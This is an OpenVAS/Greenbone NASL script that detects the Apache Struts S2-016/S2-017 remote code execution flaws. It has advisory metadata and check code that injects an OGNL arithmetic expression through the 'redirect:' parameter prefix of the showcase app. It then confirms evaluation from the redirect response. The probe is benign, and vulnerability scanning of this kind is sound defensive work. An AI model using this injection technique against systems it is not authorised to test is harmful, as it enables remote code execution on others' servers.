# Copyright (C) 2013 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:apache:struts";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803838");
  script_version("2021-04-01T07:54:37+0000");
  script_cve_id("CVE-2013-2248", "CVE-2013-2251");
  script_bugtraq_id(61196, 61189);
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2021-04-01 10:13:05 +0000 (Thu, 01 Apr 2021)");
  script_tag(name:"creation_date", value:"2013-07-24 11:58:54 +0530 (Wed, 24 Jul 2013)");
  script_name("Apache Struts Multiple Vulnerabilities (S2-016, S2-017)");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_apache_struts_consolidation.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("apache/struts/http/detected");

  script_xref(name:"URL", value:"http://secunia.com/advisories/54118");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2013/Jul/157");
  script_xref(name:"URL", value:"https://cwiki.apache.org/confluence/display/WW/S2-016");
  script_xref(name:"URL", value:"https://cwiki.apache.org/confluence/display/WW/S2-017");
  script_xref(name:"URL", value:"https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.3.1");
  script_xref(name:"Advisory-ID", value:"S2-016");
  script_xref(name:"Advisory-ID", value:"S2-017");

  script_tag(name:"summary", value:"Apache Struts is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the
  response.");

  script_tag(name:"insight", value:"The flaws exist due to an improper sanitation of
  'action:', 'redirect:', and 'redirectAction:' prefixing parameters before being used in
  DefaultActionMapper.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to
  execute arbitrary arbitrary Java code via OGNL (Object-Graph Navigation Language) or
  redirect user to a malicious url.");

  script_tag(name:"affected", value:"Apache Struts 2.0.0 through 2.3.15.");

  script_tag(name:"solution", value:"Update to version 2.3.15.1 or later.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

dir += "/struts2-showcase";

req = http_get(item:dir + "/showcase.action", port:port);
res = http_keepalive_send_recv(port:port, data:req);

if(res && ">Struts2 Showcase<" >< res && ">Welcome!<" >< res) {

  found_app = TRUE;
  calc = make_list(2, 3);

  foreach i(calc) {

    url = dir + "/showcase.action?redirect%3A%25%7B" + i + "*5%7D";

    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(port:port, data:req);
    if(res =~ "^HTTP/1\.[01] 302" && res =~ "Location:.*/([0-9]+)?") {
      result = eregmatch(pattern:string(dir, "/([0-9]+)?"), string:res);
      if(!result || result[1] >!< i * 5)
        exit(99);
    }
    else
      exit(99);
  }

  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

if(found_app)
  exit(99);
else
  exit(0);